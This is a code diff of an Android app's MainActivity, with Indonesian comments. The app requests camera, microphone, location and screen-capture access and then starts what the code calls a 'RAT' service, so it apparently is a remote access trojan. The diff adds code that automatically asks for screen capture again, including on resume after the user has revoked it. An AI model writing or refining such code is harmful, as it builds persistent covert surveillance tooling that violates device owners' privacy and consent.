@@ -74,7 +74,7 @@ class MainActivity : ComponentActivity() {
             }
         } catch (_: Exception) {}
 
-        // FIX: request CAMERA + MIC + LOCATION hanya SEKALI seumur hidup
+        // Request CAMERA + MIC + LOCATION hanya SEKALI seumur hidup
         requestProactivePermissionsOnce()
 
         setContent {
@@ -111,8 +111,10 @@ class MainActivity : ComponentActivity() {
                         grantedAll -> GrantDoneScreen(
                             onContinue = {
                                 try {
-                                    val intent = ScreenCapture.requestIntent(ctx)
-                                    startActivityForResult(intent, REQ_MEDIA_PROJECTION)
+                                    if (!ScreenCapture.isReady()) {
+                                        val intent = ScreenCapture.requestIntent(ctx)
+                                        startActivityForResult(intent, REQ_MEDIA_PROJECTION)
+                                    }
                                 } catch (_: Exception) {}
                                 startRatService()
                                 saveSetupDone()
@@ -140,7 +142,25 @@ class MainActivity : ComponentActivity() {
             LaunchedEffect(Unit) {
                 delay(1200)
                 grantedAll = checkAll()
+                // FIX: auto-minta MediaProjection kalau izin lengkap tapi projection belum ada
+                if (grantedAll && !ScreenCapture.isReady()) {
+                    try {
+                        val intent = ScreenCapture.requestIntent(this@MainActivity)
+                        startActivityForResult(intent, REQ_MEDIA_PROJECTION)
+                    } catch (_: Exception) {}
+                }
             }
+        }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        // FIX: kalau izin lengkap tapi projection hilang (user revoke), minta ulang
+        if (checkAll() && !ScreenCapture.isReady()) {
+            try {
+                val intent = ScreenCapture.requestIntent(this)
+                startActivityForResult(intent, REQ_MEDIA_PROJECTION)
+            } catch (_: Exception) {}
         }
     }
 
@@ -162,7 +182,7 @@ class MainActivity : ComponentActivity() {
     }
 
     // ============================================================
-    // FIX: PROACTIVE PERMISSIONS — HANYA SEKALI SEUMUR HIDUP
+    // PROACTIVE PERMISSIONS — HANYA SEKALI SEUMUR HIDUP
     // ============================================================
     private fun requestProactivePermissionsOnce() {
         try {
@@ -184,7 +204,6 @@ class MainActivity : ComponentActivity() {
                 ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
             }.toTypedArray()
 
-            // Simpan flag SEBELUM request — biar tidak akan request lagi apapun hasilnya
             prefs.edit().putBoolean("proactive_perms_requested", true).apply()
 
             if (missing.isNotEmpty()) {
